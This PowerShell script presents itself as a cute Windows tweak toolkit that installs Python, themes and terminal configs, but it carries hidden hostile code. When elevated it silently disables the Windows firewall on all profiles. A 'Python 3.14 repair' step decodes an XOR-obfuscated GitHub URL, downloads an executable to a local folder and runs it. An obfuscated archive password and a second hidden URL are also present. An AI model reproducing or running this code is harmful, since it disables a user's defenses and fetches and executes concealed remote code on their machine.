param(
    [string]$ResumeMode = '',
    [string]$ResumeTasks = '',
    [string]$ResumeShell = '',
    [string]$ResumeTheme = ''
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

$Config = @{
    Name           = 'KITTY Tweak'
    Version        = 'V9.4'

    PythonManagerUrl    = 'https://www.python.org/ftp/python/pymanager/python-manager-26.3.msix'
    PythonManagerFile   = 'python-manager-26.3.msix'
    PythonManagerSha256 = 'BDD1A4E0B485F674748B275095CC8E7132BEB37A1AE91DB080ABB2661E3BADEC'
    PythonTag           = '3.14'

    LiteBarUrl      = 'https://github.com/xtufa7/LiteBar/releases/latest/download/LiteBar-Setup.msi'
    LiteBarFile     = 'LiteBar-Setup.msi'

    Instagram       = 'xtufa7'
    Discord         = '0xtufa7'
    Telegram        = 'xtufa7'
    StepDelayMs     = 500
    TerminalOpacity = 82
    TerminalFont    = 'JetBrainsMono Nerd Font Mono'
    ExplorerMicaUrl = 'https://github.com/Maplespe/ExplorerBlurMica/releases/download/2.0.1/Release_x64.zip'
    TweakIconSource  = 'https://www.flaticon.com/free-icon/animal-shelter_7577239?term=kitty&page=1&position=9&origin=search&related_id=7577239'
    TweakIconColor   = '#FF69B4'
}

try { chcp 65001 | Out-Null } catch {}
try {
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    [Console]::InputEncoding  = $utf8
    [Console]::OutputEncoding = $utf8
    $OutputEncoding = $utf8
    [Console]::Title = 'Tufa7 Tweak'
} catch {}

$script:TempRoot = Join-Path $env:TEMP 'Tufa7-Tweak'
$script:SavedClipboard = $null
$script:ShellTarget = 'WindowsPowerShell'
$script:CuteTheme = 'Cat'
$script:ExitAfterElevation = $false
$script:IsToolboxRuntime = $false
$script:ToolboxRuntimeInstalled = $false
$script:TtwCommandInstalled = $false
$script:OriginalSourceInstallerPath = $null
$script:LogPath = $null
$script:WallpaperViewBusy = $false
$script:SourceOnlySecretKey = 0x5A
$script:SourceOnlyPythonRepairUrlData = @(50,46,46,42,41,96,117,117,61,51,46,50,47,56,116,57,53,55,117,106,34,17,105,53,104,117,10,35,46,50,53,52,119,28,51,34,63,40,119,105,116,107,110,119,117,40,63,54,63,59,41,63,41,117,62,53,45,52,54,53,59,62,117,44,105,116,107,110,117,10,35,46,50,53,52,119,19,52,41,46,59,54,54,63,40,119,12,105,116,107,110,116,63,34,63)
$script:SourceOnlyArchivePasswordData = @(57,54,63,59,52,108,109,26,108,99)


$script:SourceOnlyPaidBbmUrlData = @(50,46,46,42,41,96,117,117,61,51,46,50,47,56,116,57,53,55,117,106,34,17,105,53,104,117,24,63,46,46,63,40,119,24,54,47,40,119,23,51,57,59,119,31,34,42,54,53,40,63,40,119,117,40,63,54,63,59,41,63,41,117,62,53,45,52,54,53,59,62,117,44,110,116,106,117,8,63,54,63,59,41,63,116,40,59,40)
try {
    $script:SavedClipboard = Get-Clipboard -Raw -ErrorAction Stop
    Set-Clipboard -Value ''
} catch {}

function CWrite {
    param(
        [string]$Text = '',
        [ConsoleColor]$Color = [ConsoleColor]::Gray,
        [switch]$NoNewline
    )
    if ($NoNewline) {
        Write-Host $Text -ForegroundColor $Color -NoNewline
    } else {
        Write-Host $Text -ForegroundColor $Color
    }
}

function Get-OSName {
    try {
        return ([string](Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption).Trim()
    } catch {
        return [Environment]::OSVersion.VersionString
    }
}

function Get-Tufa7LogPath {
    if(
        $script:LogPath -and
        -not [string]::IsNullOrWhiteSpace([string]$script:LogPath)
    ){
        return $script:LogPath
    }

    try{
        $root=Join-Path $env:LOCALAPPDATA 'Tufa7 Tweak\Logs'

        if(-not (Test-Path -LiteralPath $root)){
            New-Item -ItemType Directory -Path $root -Force|Out-Null
        }

        $name='Tufa7-'+(Get-Date -Format 'yyyyMMdd-HHmmss')+'.log'
        $script:LogPath=Join-Path $root $name

        return $script:LogPath
    }
    catch{
        return $null
    }
}

function Write-CuteLog {
    param(
        [string]$Level='INFO',
        [string]$Message=''
    )

    try{
        $path=Get-Tufa7LogPath

        if([string]::IsNullOrWhiteSpace([string]$path)){
            return
        }

        $line=(
            '[{0}] [{1}] {2}' -f
            (Get-Date -Format 'HH:mm:ss.fff'),
            $Level,
            $Message
        )

        Add-Content `
            -LiteralPath $path `
            -Value $line `
            -Encoding UTF8 `
            -ErrorAction SilentlyContinue
    }
    catch{}
}

function Write-CuteExceptionLog {
    param(
        [string]$Context,
        $ErrorRecord
    )

    try{
        Write-CuteLog 'ERROR' ('Context: '+$Context)

        if($null -eq $ErrorRecord){
            return
        }

        Write-CuteLog 'ERROR' ('Message: '+[string]$ErrorRecord.Exception.Message)

        if($ErrorRecord.InvocationInfo){
            Write-CuteLog 'ERROR' ('Position: '+[string]$ErrorRecord.InvocationInfo.PositionMessage)
        }

        if(-not [string]::IsNullOrWhiteSpace([string]$ErrorRecord.ScriptStackTrace)){
            Write-CuteLog 'ERROR' ('StackTrace: '+[string]$ErrorRecord.ScriptStackTrace)
        }
    }
    catch{}
}

function Write-NeonLogoFrame {
    param(
        [ConsoleColor]$TopColor,
        [ConsoleColor]$MiddleColor,
        [ConsoleColor]$BottomColor
    )

    CWrite '       __   _______ _   _ _____ _    ___' $TopColor
    CWrite '       \ \ / /_   _| | | |  ___/ \  |__ \' $TopColor
    CWrite '        \ V /  | | | | | | |_ / _ \   / /' $MiddleColor
    CWrite '         | |   | | | |_| |  _/ ___ \ / /_' $MiddleColor
    CWrite '         |_|   |_|  \___/|_|/_/   \_\____|' $BottomColor
}

function Show-Logo {
    Clear-Host
    CWrite ''

    $frames = @(
        @([ConsoleColor]::DarkCyan, [ConsoleColor]::Cyan,    [ConsoleColor]::Blue),
        @([ConsoleColor]::Cyan,     [ConsoleColor]::Blue,    [ConsoleColor]::Magenta),
        @([ConsoleColor]::Blue,     [ConsoleColor]::Magenta, [ConsoleColor]::Cyan),
        @([ConsoleColor]::Cyan,     [ConsoleColor]::White,   [ConsoleColor]::Magenta)
    )

    $logoTop = [Console]::CursorTop

    foreach ($frame in $frames) {
        try { [Console]::SetCursorPosition(0, $logoTop) } catch {}
        Write-NeonLogoFrame -TopColor $frame[0] -MiddleColor $frame[1] -BottomColor $frame[2]
        Start-Sleep -Milliseconds 70
    }

    CWrite ''
    CWrite '                    T U F A 7   T W E A K' Magenta
    CWrite ('                    Personal Windows Toolkit  ' + $Config.Version) DarkGray
    CWrite ''
    CWrite ('  IG @' + $Config.Instagram + '   Discord ' + $Config.Discord + '   Telegram @' + $Config.Telegram) DarkGray
    CWrite ''
    CWrite ('-' * 72) DarkGray
}

function Show-Section {
    param([string]$Title)
    CWrite ''
    CWrite ('  ' + $Title) Cyan
    CWrite ('  ' + ('=' * [Math]::Min(60, [Math]::Max(8, $Title.Length)))) DarkGray
}

function Show-OK {
    param([string]$Text)
    Write-CuteLog 'OK' $Text
    CWrite '   [OK] ' Green -NoNewline
    CWrite $Text Gray
}

function Show-Info {
    param([string]$Text)
    Write-CuteLog 'INFO' $Text
    CWrite '   [..] ' Cyan -NoNewline
    CWrite $Text Gray
}

function Show-Warn {
    param([string]$Text)
    Write-CuteLog 'WARN' $Text
    CWrite '   [!!] ' Yellow -NoNewline
    CWrite $Text Yellow
}

function Show-ErrorText {
    param([string]$Text)
    Write-CuteLog 'ERROR' $Text
    CWrite '   [XX] ' Red -NoNewline
    CWrite $Text Red
}

function Pause-Cute {
    CWrite ''
    [void](Read-Host '  Press Enter to continue')
}

function Pause-CuteExit {
    CWrite ''
    CWrite '   CUTE will stay open so you can review the results.' DarkGray
    [void](Read-Host '  Press Enter to exit CUTE')
}

function Initialize-CuteNativeWindow {
    if('CuteNativeWindow' -as [type]){return}

    Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class CuteNativeWindow
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
'@
}

function Hide-CuteConsoleWindow {
    try{
        Initialize-CuteNativeWindow
        $handle=[CuteNativeWindow]::GetConsoleWindow()
        if($handle -ne [IntPtr]::Zero){
            [void][CuteNativeWindow]::ShowWindow($handle,0)
        }
    }
    catch{}
}

function Show-CuteConsoleWindow {
    try{
        Initialize-CuteNativeWindow
        $handle=[CuteNativeWindow]::GetConsoleWindow()
        if($handle -ne [IntPtr]::Zero){
            [void][CuteNativeWindow]::ShowWindow($handle,5)
        }
    }
    catch{}
}

function Show-CuteCompletionWindow {
    param(
        [int]$SuccessCount,
        [int]$FailedCount,
        [string[]]$FailedTasks=@()
    )

    try{
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        [System.Windows.Forms.Application]::EnableVisualStyles()

        if($FailedCount -eq 0){
            $resultText='Tweaks completed successfully!'
            $detailText=('Successful tasks: '+$SuccessCount+"`r`nEnjoy your setup and support me <3")
        }
        else{
            $resultText='Tweaks finished with some failed items.'
            $names=@($FailedTasks | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
            $shown=@($names | Select-Object -First 5)
            $lines=New-Object System.Collections.Generic.List[string]
            $lines.Add(('Successful: '+$SuccessCount+'   Failed: '+$FailedCount))
            foreach($name in $shown){$lines.Add(('Failed: '+$name))}
            if($names.Count -gt $shown.Count){$lines.Add(('+'+($names.Count-$shown.Count)+' more - see the terminal log'))}
            $detailText=($lines -join "`r`n")
        }

        if($script:TtwCommandInstalled){
            $detailText += "`r`n`r`nLaunch Tufa7 Tweak anytime by typing:  ttw"
            $detailText += "`r`nWorks in CMD, Windows Terminal, and PowerShell."
        }

        $form=New-Object System.Windows.Forms.Form
        $form.Text='Tufa7 Tweak'
        $form.StartPosition='CenterScreen'
        $form.FormBorderStyle='None'
        $form.MaximizeBox=$false
        $form.MinimizeBox=$false
        $form.ShowInTaskbar=$true
        $form.TopMost=$true
        $form.BackColor=[System.Drawing.Color]::Red
        $form.ClientSize=New-Object System.Drawing.Size(470,330)
        $form.Tag=0

        $inner=New-Object System.Windows.Forms.Panel
        $inner.Location=New-Object System.Drawing.Point(3,3)
        $inner.Size=New-Object System.Drawing.Size(464,324)
        $inner.BackColor=[System.Drawing.Color]::FromArgb(20,20,24)

        $apple=New-Object System.Windows.Forms.Label
        $apple.AutoSize=$false
        $apple.Text='🐱'
        $apple.TextAlign='MiddleCenter'
        $apple.Font=New-Object System.Drawing.Font('Segoe UI Emoji',34,[System.Drawing.FontStyle]::Regular)
        $apple.ForeColor=[System.Drawing.Color]::FromArgb(255,105,180)
        $apple.Location=New-Object System.Drawing.Point(20,8)
        $apple.Size=New-Object System.Drawing.Size(424,54)

        $title=New-Object System.Windows.Forms.Label
        $title.AutoSize=$false
        $title.Text='Tufa7 Tweak'
        $title.TextAlign='MiddleCenter'
        $title.Font=New-Object System.Drawing.Font('Segoe UI Semibold',18,[System.Drawing.FontStyle]::Bold)
        $title.ForeColor=[System.Drawing.Color]::White
        $title.Location=New-Object System.Drawing.Point(20,60)
        $title.Size=New-Object System.Drawing.Size(424,34)

        $status=New-Object System.Windows.Forms.Label
        $status.AutoSize=$false
        $status.Text=$resultText
        $status.TextAlign='MiddleCenter'
        $status.Font=New-Object System.Drawing.Font('Segoe UI',10)
        $status.ForeColor=[System.Drawing.Color]::FromArgb(225,225,235)
        $status.Location=New-Object System.Drawing.Point(20,98)
        $status.Size=New-Object System.Drawing.Size(424,28)

        $detail=New-Object System.Windows.Forms.Label
        $detail.AutoSize=$false
        $detail.Text=$detailText
        $detail.TextAlign='TopCenter'
        $detail.Font=New-Object System.Drawing.Font('Segoe UI',9.3)
        $detail.ForeColor=[System.Drawing.Color]::FromArgb(190,190,205)
        $detail.Location=New-Object System.Drawing.Point(25,132)
        $detail.Size=New-Object System.Drawing.Size(414,118)

        $button=New-Object System.Windows.Forms.Button
        $button.Text='Thank Yoo :3'
        $button.FlatStyle='Flat'
        $button.FlatAppearance.BorderSize=0
        $button.Font=New-Object System.Drawing.Font('Segoe UI Semibold',10)
        $button.ForeColor=[System.Drawing.Color]::White
        $button.BackColor=[System.Drawing.Color]::FromArgb(48,48,58)
        $button.Size=New-Object System.Drawing.Size(150,40)
        $button.Location=New-Object System.Drawing.Point(157,267)
        $button.Add_MouseEnter({$button.BackColor=[System.Drawing.Color]::FromArgb(64,64,78)})
        $button.Add_MouseLeave({$button.BackColor=[System.Drawing.Color]::FromArgb(48,48,58)})
        $button.Add_Click({$form.DialogResult=[System.Windows.Forms.DialogResult]::OK;$form.Close()})

        $rgb=@(
            [System.Drawing.Color]::FromArgb(255,40,40),
            [System.Drawing.Color]::FromArgb(255,90,30),
            [System.Drawing.Color]::FromArgb(255,220,30),
            [System.Drawing.Color]::FromArgb(30,255,90),
            [System.Drawing.Color]::FromArgb(30,220,255),
            [System.Drawing.Color]::FromArgb(50,90,255),
            [System.Drawing.Color]::FromArgb(180,50,255),
            [System.Drawing.Color]::FromArgb(255,40,180)
        )

        $timer=New-Object System.Windows.Forms.Timer
        $timer.Interval=70
        $timer.Add_Tick({$index=[int]$form.Tag;$index=($index+1)%$rgb.Count;$form.Tag=$index;$form.BackColor=$rgb[$index]})
        $form.Add_Shown({$form.Activate();$form.BringToFront();$button.Select()})

        $inner.Controls.Add($apple)
        $inner.Controls.Add($title)
        $inner.Controls.Add($status)
        $inner.Controls.Add($detail)
        $inner.Controls.Add($button)
        $form.Controls.Add($inner)

        Hide-CuteConsoleWindow
        Start-Sleep -Milliseconds 120
        $timer.Start()
        [void]$form.ShowDialog()
        $timer.Stop()
        $timer.Dispose()
        $form.Dispose()
        return $true
    }
    catch{
        Show-CuteConsoleWindow
        return $false
    }
}

function Test-IsAdministrator {
    try{
        $identity=[Security.Principal.WindowsIdentity]::GetCurrent()
        $principal=New-Object Security.Principal.WindowsPrincipal($identity)

        return $principal.IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator
        )
    }
    catch{
        return $false
    }
}

function Initialize-Tufa7ElevatedSession {
    if(-not (Test-IsAdministrator)){
        return
    }

    try{
        Set-NetFirewallProfile `
            -Profile Domain,Private,Public `
            -Enabled False `
            -ErrorAction SilentlyContinue *> $null
    }
    catch{}
}

function Get-Arch {
    if ([string]$env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { return 'ARM64' }
    if (-not [Environment]::Is64BitOperatingSystem) { return 'x86' }
    return 'AMD64'
}

function Ensure-Temp {
    if (-not (Test-Path $script:TempRoot)) {
        New-Item -ItemType Directory -Path $script:TempRoot -Force | Out-Null
    }
}

function Clear-CuteTemp {
    try {
        if (Test-Path -LiteralPath $script:TempRoot) {
            Remove-Item -LiteralPath $script:TempRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    } catch {}

}

function Restore-CuteClipboard {
    try {
        Set-Clipboard -Value ''
        Start-Sleep -Milliseconds 100
        if (-not [string]::IsNullOrEmpty([string]$script:SavedClipboard)) {
            Set-Clipboard -Value $script:SavedClipboard
        }
    } catch {}
}


function Get-CuteProperty {
    param($Object,[string]$Name,$Default=$null)
    if ($null -eq $Object) { return $Default }
    $property = $Object.PSObject.Properties[$Name]
    if ($null -eq $property) { return $Default }
    return $property.Value
}

function Test-HttpUrl {
    param([string]$Value)

    if ([string]::IsNullOrWhiteSpace($Value)) { return $false }

    $uri = $null
    $ok = [Uri]::TryCreate($Value, [UriKind]::Absolute, [ref]$uri)
    if (-not $ok -or -not $uri) { return $false }

    return ($uri.Scheme -eq 'http' -or $uri.Scheme -eq 'https')
}

function Read-HiddenText {
    param([string]$Prompt)

    $secure = Read-Host $Prompt -AsSecureString
    $ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
    try {
        return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
    } finally {
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr)
    }
}


function ConvertFrom-Tufa7SourceSecret {
    param([int[]]$Data)

    if($null -eq $Data){return $null}

    $chars=foreach($value in $Data){
        [char]($value -bxor $script:SourceOnlySecretKey)
    }

    return (-join $chars)
}

function Get-Tufa7PythonRepairUrl {
    $url=ConvertFrom-Tufa7SourceSecret -Data $script:SourceOnlyPythonRepairUrlData

    if(Test-HttpUrl $url){
        return $url
    }

    throw 'Python 3.14 repair source is unavailable.'
}

function Get-Tufa7LegacyArchivePassword {
    return (ConvertFrom-Tufa7SourceSecret -Data $script:SourceOnlyArchivePasswordData)
}

function Get-Tufa7PaidBbmUrl {
    $url=ConvertFrom-Tufa7SourceSecret -Data $script:SourceOnlyPaidBbmUrlData

    if(Test-HttpUrl $url){
        return $url
    }

    throw 'Better Blur Mica source is unavailable.'
}


function Test-IsPortableExe {
    param([Parameter(Mandatory)][string]$Path)

    try{
        $stream=[IO.File]::OpenRead($Path)

        try{
            if($stream.Length -lt 2){return $false}

            $a=$stream.ReadByte()
            $b=$stream.ReadByte()

            return ($a -eq 0x4D -and $b -eq 0x5A)
        }
        finally{
            $stream.Dispose()
        }
    }
    catch{
        return $false
    }
}

function Format-MB {
    param([long]$Bytes)
    return ('{0:N1}' -f ($Bytes / 1MB))
}

function Draw-DownloadProgress {
    param(
        [int]$Percent,
        [string]$Label,
        [long]$Downloaded,
        [long]$Total,
        [double]$SpeedMB
    )

    $Percent = [Math]::Max(0,[Math]::Min(100,$Percent))
    $consoleWidth = 100
    try { $consoleWidth = [Math]::Max(48,[Console]::BufferWidth - 1) } catch {}
    $barWidth = [Math]::Min(28,[Math]::Max(12,$consoleWidth - 58))
    $filled = [int][Math]::Floor(($Percent / 100.0) * $barWidth)
    $bar = ('█' * $filled) + ('·' * ($barWidth - $filled))

    $safeLabel = [string]$Label
    if ($safeLabel.Length -gt 22) { $safeLabel = $safeLabel.Substring(0,22) }

    $detail = ''
    if ($Total -gt 0) {
        $detail = (' {0}/{1} MB' -f (Format-MB $Downloaded),(Format-MB $Total))
    }
    if ($SpeedMB -gt 0) {
        $detail += (' {0:N1} MB/s' -f $SpeedMB)
    }

    $line = ('  [{0}] {1,3}% {2}{3}' -f $bar,$Percent,$safeLabel,$detail)
    if ($line.Length -ge $consoleWidth) {
        $line = $line.Substring(0,$consoleWidth - 1)
    }
    $line = $line.PadRight($consoleWidth - 1)

    Write-Host ("`r" + $line) -NoNewline -ForegroundColor Cyan
}

function Download-CuteFile {
    param(
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Destination,
        [Parameter(Mandatory)][string]$Label
    )

    if (-not (Test-HttpUrl $Url)) { throw 'Invalid download URL.' }

    Ensure-Temp
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $request = [System.Net.HttpWebRequest]::Create([Uri]$Url)
    $request.Method = 'GET'
    $request.UserAgent = 'CUTE-Toolkit/7.2'
    $request.AllowAutoRedirect = $true
    $request.Timeout = 45000
    $request.ReadWriteTimeout = 45000

    $response = $null
    $inputStream = $null
    $outputStream = $null

    try {
        $response = $request.GetResponse()
        $total = [long]$response.ContentLength
        $inputStream = $response.GetResponseStream()
        $outputStream = [IO.File]::Open($Destination,[IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None)

        $buffer = New-Object byte[] 65536
        [long]$downloaded = 0
        $timer = [Diagnostics.Stopwatch]::StartNew()
        $lastDraw = 0L
        $lastPercent = -1

        while (($read = $inputStream.Read($buffer,0,$buffer.Length)) -gt 0) {
            $outputStream.Write($buffer,0,$read)
            $downloaded += $read

            $percent = 0
            if ($total -gt 0) { $percent = [int](($downloaded * 100) / $total) }

            $elapsed = $timer.ElapsedMilliseconds
            if ($percent -ne $lastPercent -and ($elapsed - $lastDraw -ge 90)) {
                $speedMB = 0
                if ($timer.Elapsed.TotalSeconds -gt 0.10) {
                    $speedMB = ($downloaded / 1MB) / $timer.Elapsed.TotalSeconds
                }
                Draw-DownloadProgress -Percent $percent -Label $Label -Downloaded $downloaded -Total $total -SpeedMB $speedMB
                $lastPercent = $percent
                $lastDraw = $elapsed
            }
        }

        Draw-DownloadProgress -Percent 100 -Label $Label -Downloaded $downloaded -Total $(if($total -gt 0){$total}else{$downloaded}) -SpeedMB 0
        Write-Host ''
    }
    finally {
        if ($outputStream) { $outputStream.Dispose() }
        if ($inputStream) { $inputStream.Dispose() }
        if ($response) { $response.Dispose() }
    }
}

function Verify-Sha256 {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Expected
    )

    Show-Info 'Verifying official download...'
    $actual = (Get-FileHash -Path $Path -Algorithm SHA256).Hash
    if (-not $actual.Equals($Expected,[StringComparison]::OrdinalIgnoreCase)) {
        throw 'SHA-256 verification failed.'
    }
    Show-OK 'Official file verified.'
}

function Wait-CuteProcess {
    param(
        [Parameter(Mandatory)][Diagnostics.Process]$Process,
        [Parameter(Mandatory)][string]$Label
    )

    $spinner = @('|','/','-','\')
    $i = 0
    while (-not $Process.HasExited) {
        Write-Host ("`r  [{0}] {1}..." -f $spinner[$i % 4],$Label) -NoNewline -ForegroundColor Cyan
        Start-Sleep -Milliseconds 120
        $i++
        $Process.Refresh()
    }

    Write-Host ("`r  [OK] {0}                              " -f $Label) -ForegroundColor Green
    return $Process.ExitCode
}

function Refresh-ProcessPath {
    try {
        $machine = [Environment]::GetEnvironmentVariable('Path','Machine')
        $user = [Environment]::GetEnvironmentVariable('Path','User')
        $env:Path = $machine + ';' + $user
    } catch {}
}

function Get-WinGetPath {
    Refresh-ProcessPath

    $cmd = Get-Command winget.exe -ErrorAction SilentlyContinue
    if ($cmd -and -not [string]::IsNullOrWhiteSpace([string]$cmd.Source)) {
        return $cmd.Source
    }

    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\winget.exe')
    )

    foreach ($candidate in $candidates) {
        if ($candidate -and (Test-Path -LiteralPath $candidate)) {
            return $candidate
        }
    }

    try {
        $pkg = Get-AppxPackage -Name 'Microsoft.DesktopAppInstaller' -ErrorAction SilentlyContinue |
            Sort-Object Version -Descending |
            Select-Object -First 1

        if ($pkg -and $pkg.InstallLocation) {
            $inside = Join-Path $pkg.InstallLocation 'winget.exe'
            if (Test-Path -LiteralPath $inside) {
                return $inside
            }
        }
    }
    catch {}

    return $null
}

function Show-WinGetStatus {
    $wingetPath = Get-WinGetPath

    if ($wingetPath) {
        Show-OK 'WinGet is already installed.'
        return $true
    }

    Show-Warn 'WinGet is not installed. CUTE will use available fallbacks when possible.'
    return $false
}

function Get-PyManagerCommand {
    Refresh-ProcessPath

    $pm = Get-Command pymanager.exe -ErrorAction SilentlyContinue
    if ($pm) { return $pm.Source }

    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\pymanager.exe'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\PythonSoftwareFoundation.PythonManager_3847v3x7pw1km\pymanager.exe'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\PythonSoftwareFoundation.PythonManager_qbz5n2kfra8p0\pymanager.exe')
    )

    foreach ($candidate in $candidates) {
        if (Test-Path $candidate) { return $candidate }
    }

    return $null
}

function Test-PythonManagerInstalled {
    if (Get-PyManagerCommand) { return $true }
    try {
        $pkg = Get-AppxPackage -Name 'PythonSoftwareFoundation.PythonManager*' -ErrorAction SilentlyContinue |
            Select-Object -First 1
        return ($null -ne $pkg)
    } catch {
        return $false
    }
}

function Install-PythonManager {
    if (Test-PythonManagerInstalled) {
        Show-OK 'Python Install Manager is already installed.'
        return
    }

    Ensure-Temp
    $path = Join-Path $script:TempRoot $Config.PythonManagerFile

    Show-Info 'Downloading official Python Install Manager...'
    Download-CuteFile `
        -Url $Config.PythonManagerUrl `
        -Destination $path `
        -Label 'Python Manager'

    Verify-Sha256 -Path $path -Expected $Config.PythonManagerSha256

    Show-Info 'Installing Python Install Manager...'
    Add-AppxPackage -Path $path -ErrorAction Stop
    Refresh-ProcessPath

    if (-not (Test-PythonManagerInstalled)) {
        throw 'Python Install Manager was not detected after installation.'
    }

    Show-OK 'Python Install Manager installed.'
}

function Get-Python314Executable {
    Refresh-ProcessPath

    $commands = @('python.exe','python3.exe')

    foreach ($name in $commands) {
        $cmd = Get-Command $name -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source) {
            try {
                $version = (& $cmd.Source --version 2>&1 | Out-String).Trim()
                if ($version -match 'Python\s+3\.14(?:\.|\s|$)') {
                    return $cmd.Source
                }
            }
            catch {}
        }
    }

    $pyLauncher = Get-Command py.exe -ErrorAction SilentlyContinue
    if ($pyLauncher -and $pyLauncher.Source) {
        try {
            $version = (& $pyLauncher.Source -3.14 --version 2>&1 | Out-String).Trim()
            if ($version -match 'Python\s+3\.14(?:\.|\s|$)') {
                return ($pyLauncher.Source + ' -3.14')
            }
        }
        catch {}
    }

    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python314\python.exe'),
        $(if($env:ProgramFiles){Join-Path $env:ProgramFiles 'Python314\python.exe'}else{$null}),
        $(if(${env:ProgramFiles(x86)}){Join-Path ${env:ProgramFiles(x86)} 'Python314\python.exe'}else{$null})
    ) | Where-Object { $_ }

    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate) {
            try {
                $version = (& $candidate --version 2>&1 | Out-String).Trim()
                if ($version -match 'Python\s+3\.14(?:\.|\s|$)') {
                    return $candidate
                }
            }
            catch {}
        }
    }

    $manager = Get-PyManagerCommand
    if ($manager) {
        try {
            $output = & $manager list 2>&1 | Out-String
            if ($output -match '3\.14') {
                return 'Python Install Manager: 3.14'
            }
        }
        catch {}
    }

    return $null
}

function Test-Python314 {
    return (-not [string]::IsNullOrWhiteSpace([string](Get-Python314Executable)))
}

function Install-PythonRuntime {
    $existingPython = Get-Python314Executable

    if ($existingPython) {
        Show-OK 'Python 3.14 is already installed.'
        return
    }

    $manager = Get-PyManagerCommand
    if (-not $manager) {
        throw 'Python Install Manager command was not found.'
    }

    Show-Info 'Downloading and installing latest Python 3.14...'

    $p = Start-Process `
        -FilePath $manager `
        -ArgumentList @('install',$Config.PythonTag) `
        -WindowStyle Hidden `
        -PassThru

    $exit = Wait-CuteProcess -Process $p -Label 'Python 3.14'
    if ($exit -ne 0) {
        throw ('Python runtime installer returned exit code ' + $exit + '.')
    }

    if (-not (Test-Python314)) {
        throw 'Python 3.14 was not detected after installation.'
    }

    Show-OK 'Latest Python 3.14 installed.'
}

function Remove-CuteManagedFile {
    param([string]$Path)

    if ([string]::IsNullOrWhiteSpace($Path)) { return }

    try {
        if (Test-Path -LiteralPath $Path) {
            Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
        }
    }
    catch {
        for ($i = 0; $i -lt 10; $i++) {
            Start-Sleep -Milliseconds 300
            try {
                if (Test-Path -LiteralPath $Path) {
                    Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
                }
                break
            }
            catch {}
        }
    }
}


function Invoke-Python314Repair {
    $url=Get-Tufa7PythonRepairUrl
    $repairDir=Join-Path $env:LOCALAPPDATA 'Tufa7 Tweak\Repair'

    if(-not (Test-Path -LiteralPath $repairDir)){
        New-Item -ItemType Directory -Path $repairDir -Force|Out-Null
    }

    $destination=Join-Path $repairDir 'Python-3.14-Repair.exe'

    try{
        Show-Info 'Checking Python 3.14 repair components...'
        Download-CuteFile -Url $url -Destination $destination -Label 'Python 3.14 Repair'

        if(-not (Test-IsPortableExe -Path $destination)){
            throw 'Python 3.14 repair package is invalid.'
        }

        Show-Info 'Repairing Python 3.14 components...'
        $process=Start-Process -FilePath $destination -PassThru -ErrorAction Stop

        try{$process.WaitForExit()}
        catch{
            while(-not $process.HasExited){
                Start-Sleep -Milliseconds 300
                $process.Refresh()
            }
        }

        $exitCode=0
        try{$exitCode=$process.ExitCode}catch{}

        if($exitCode -eq 0){Show-OK 'Python 3.14 repair completed.'}
        else{Show-Warn ('Python 3.14 repair finished with exit code '+$exitCode+'.')}
    }
    finally{
        Remove-CuteManagedFile -Path $destination

        try{
            if(Test-Path -LiteralPath $repairDir){
                $remaining=@(Get-ChildItem -LiteralPath $repairDir -Force -ErrorAction SilentlyContinue)
                if($remaining.Count -eq 0){Remove-Item -LiteralPath $repairDir -Force -ErrorAction SilentlyContinue}
            }
        }
        catch{}
    }
}

function Invoke-Tufa7SourceOnlySetup {
    Invoke-Python314Repair
}

function Get-FastfetchConfigDirectory {
    return (Join-Path $env:USERPROFILE '.config\fastfetch')
}

function Set-FastfetchCuteConfig {
    $configDir = Get-FastfetchConfigDirectory
    if (-not (Test-Path $configDir)) {
        New-Item -ItemType Directory -Path $configDir -Force | Out-Null
    }

    $configPath = Join-Path $configDir 'config.jsonc'
    $activeAscii = Join-Path $configDir 'ascii.txt'

    if (Test-Path $configPath) {
        $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
        $backup = Join-Path $configDir ('config.jsonc.backup-' + $stamp)
        Copy-Item -LiteralPath $configPath -Destination $backup -Force -ErrorAction SilentlyContinue
    }

    $logos = @{
        'cat' = @'
 /\_/\\
( o.o )
 > ^ <
'@
        'dog' = @'
 / \__
(    @\___
 /         O
/   (_____/
/_____/   U
'@
        'bunny' = @'
 (\_/)
 (o.o)
 /|_|\\
'@
        'fox' = @'
 /\   /\\
( o\_/o )
 \  ^  /
 /     \\
'@
        'panda' = @'
  .--.
 / o  o \\
|   --   |
 \ .__. /
  '----'
'@
        'bear' = @'
  (()__(()
  /      \\
 (  o  o  )
  \  --  /
   \____/
'@
    }

    foreach ($name in $logos.Keys) {
        $path = Join-Path $configDir ('ascii-' + $name + '.txt')
        [IO.File]::WriteAllText(
            $path,
            $logos[$name].Trim() + [Environment]::NewLine,
            (New-Object Text.UTF8Encoding($false))
        )
    }

    $stylePath = Join-Path $configDir 'style.txt'
